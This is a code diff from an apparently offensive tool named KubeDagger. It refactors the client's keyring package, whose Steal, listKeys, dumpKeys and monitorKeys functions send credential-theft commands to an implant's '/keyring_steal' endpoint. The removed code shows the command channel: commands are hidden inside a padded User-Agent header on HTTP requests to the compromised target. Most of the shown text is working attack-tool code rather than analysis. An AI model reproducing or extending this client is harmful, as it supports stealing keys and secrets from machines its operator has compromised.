@@ -3,23 +3,15 @@ package keyring
 import (
 	"encoding/json"
 	"fmt"
-	"net/http"
 	"os"
-	"strings"
 
-	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/model"
+	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/shared"
 )
 
 type KeyringResult struct {
-	Mode    string       `json:"mode"`
-	Actions []ActionInfo `json:"actions"`
-	Success bool         `json:"success"`
-}
-
-type ActionInfo struct {
-	Name   string `json:"name"`
-	Status string `json:"status"`
-	Detail string `json:"detail"`
+	Mode    string              `json:"mode"`
+	Actions []shared.ActionInfo `json:"actions"`
+	Success bool                `json:"success"`
 }
 
 func Steal(target, mode, keyType, output string) error {
@@ -71,15 +63,15 @@ func listKeys(target, keyType string) *KeyringResult {
 
 	for _, a := range actions {
 		cmd := a.cmd + "#" + keyType
-		status := sendKeyringCommand(target, cmd)
-		result.Actions = append(result.Actions, ActionInfo{
+		status := shared.SendCommand(target, "/keyring_steal", cmd)
+		result.Actions = append(result.Actions, shared.ActionInfo{
 			Name:   a.name,
 			Status: status,
 			Detail: a.detail,
 		})
 	}
 
-	result.Success = allSucceeded(result.Actions)
+	result.Success = shared.AllSucceeded(result.Actions)
 	return result
 }
 
@@ -115,15 +107,15 @@ func dumpKeys(target, keyType string) *KeyringResult {
 
 	for _, a := range actions {
 		cmd := a.cmd + "#" + keyType
-		status := sendKeyringCommand(target, cmd)
-		result.Actions = append(result.Actions, ActionInfo{
+		status := shared.SendCommand(target, "/keyring_steal", cmd)
+		result.Actions = append(result.Actions, shared.ActionInfo{
 			Name:   a.name,
 			Status: status,
 			Detail: a.detail,
 		})
 	}
 
-	result.Success = allSucceeded(result.Actions)
+	result.Success = shared.AllSucceeded(result.Actions)
 	return result
 }
 
@@ -149,52 +141,14 @@ func monitorKeys(target, keyType string) *KeyringResult {
 
 	for _, a := range actions {
 		cmd := a.cmd + "#" + keyType
-		status := sendKeyringCommand(target, cmd)
-		result.Actions = append(result.Actions, ActionInfo{
+		status := shared.SendCommand(target, "/keyring_steal", cmd)
+		result.Actions = append(result.Actions, shared.ActionInfo{
 			Name:   a.name,
 			Status: status,
 			Detail: a.detail,
 		})
 	}
 
-	result.Success = allSucceeded(result.Actions)
+	result.Success = shared.AllSucceeded(result.Actions)
 	return result
-}
-
-func sendKeyringCommand(target, command string) string {
-	ua := buildUserAgent(command)
-
-	req, err := http.NewRequest("GET", target+"/keyring_steal", nil)
-	if err != nil {
-		return "error: " + err.Error()
-	}
-	req.Header.Set("User-Agent", ua)
-
-	resp, err := http.DefaultClient.Do(req)
-	if err != nil {
-		return "error: " + err.Error()
-	}
-	defer resp.Body.Close()
-
-	if resp.StatusCode == http.StatusOK {
-		return "enabled"
-	}
-	return fmt.Sprintf("failed (HTTP %d)", resp.StatusCode)
-}
-
-func buildUserAgent(command string) string {
-	userAgent := command
-	for len(userAgent) < model.UserAgentPaddingLen {
-		userAgent += "#"
-	}
-	return userAgent
-}
-
-func allSucceeded(actions []ActionInfo) bool {
-	for _, a := range actions {
-		if !strings.HasPrefix(a.Status, "enabled") {
-			return false
-		}
-	}
-	return true
 }
